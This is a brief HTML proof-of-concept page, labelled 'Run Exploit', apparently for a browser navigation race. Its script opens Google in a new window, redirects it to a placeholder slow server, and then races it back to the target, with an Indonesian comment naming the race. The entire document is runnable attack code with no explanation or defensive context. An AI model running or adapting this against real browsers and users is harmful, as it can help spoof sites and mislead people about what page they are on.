<button onclick="run()">Run Exploit</button>

<script>
const TARGET = "https://www.google.com";
const SERVER = "https://your-server/slow.php?s=10";

function run() {
  const w = window.open(TARGET);

  setTimeout(() => {
    w.location.href = SERVER;

    // race balik ke target
    setTimeout(() => {
      w.location.href = TARGET;
    }, 100);

  }, 1000);
}
</script>
